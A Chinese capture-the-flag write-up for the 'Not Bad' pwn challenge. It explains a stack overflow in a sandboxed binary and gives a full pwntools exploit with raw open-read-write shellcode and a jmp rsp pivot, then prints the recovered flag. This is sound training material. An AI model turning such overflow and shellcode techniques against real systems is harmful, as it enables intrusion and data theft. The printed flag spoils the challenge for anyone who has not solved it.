# [极客大挑战 2019]Not Bad

[题目地址](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad)

基础不够，[wp](https://blog.csdn.net/weixin_46521144/article/details/115196495)来凑。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

看这个checksec就知道这题难不到哪里去。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);
  seccomp();
  setvbuf();
  vuln();
  return 0LL;
}
```

main函数很简单，seccomp设置了沙盒，只能用open，read和wirte三个函数，我就不放了。漏洞在vuln函数里，看vuln。

```c
int vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Easy shellcode, have fun!");
  read(0, buf, 0x38uLL);
  return puts("Baddd! Focu5 me! Baddd! Baddd!");
}
```

溢出字节不多，容易想到栈迁移。不过这题nx都没开，搞栈迁移有点小题大做了，直接跟程序里说的一样构造shellcode。沙盒有点烦人，这次的shellcode是拿不到shell了，用个orw读flag。orw其实就是open-read-write的缩写。这题有个神奇的地方，buf正好在rsp，让我们的利用轻松了许多。wp写得很详细了，我就再补充一下。

```python
from pwn import *
context.arch='amd64'
context.log_level='debug'

s=remote('node4.buuoj.cn',28889)

mmap=0x123000
jmp_rsp=0x400a01

""" orw_payload = shellcraft.open("./flag") 打开flag文件
orw_payload += shellcraft.read(3, mmap+0x100, 0x50) 根据打开的flag文件句柄（0，1，2系统占用，接下来打开的文件一般都是3）读取flag到mmap段
orw_payload += shellcraft.write(1, mmap+0x100,0x50) 输出flag

payload=asm(shellcraft.read(0,mmap,0x100))+asm('mov rax,0x123000;call rax') 这里的shellcode先调用read把装不下的orw shellcode读取到mmap段，然后把orw shellcode的起始地址mov进rax，call rax开始执行orw shellcode
payload=payload.ljust(0x28,b'\x00') 作填充，让下面的内容能覆盖到返回地址
payload+=p64(jmp_rsp)+asm('sub rsp,0x30;jmp rsp') """ #jmp_rsp覆盖到了返回地址，程序会执行jmp_rsp。当程序执行到这一句时，rsp会对应着接下来的asm('sub rsp,0x30;jmp rsp')，那么jmp rsp就是执行了sub rsp,0x30;jmp rsp。sub rsp，0x30让rsp回到buf的起始处asm(shellcraft.read(0,mmap,0x100))，因为payload的前部分0x28+p64(jmp_rsp)=0x30。jmp rsp就能执行buf里的shellcode了
payload=b'1\xc01\xff1\xd2\xb6\x01\xbe\x01\x01\x01\x01\x81\xf6\x011\x13\x01\x0f\x05H\xc7\xc0\x000\x12\x00\xff\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\n@\x00\x00\x00\x00\x00H\x83\xec0\xff\xe4'
s.sendline(payload)
orw_payload=b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8/.gm`f\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x010\x13\x01\x0f\x05j\x01_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x010\x13\x01j\x01X\x0f\x05'
s.send(orw_payload)

s.interactive()
```

## Flag
> flag{96f03c6d-b6b2-4310-903b-061652ab1f90}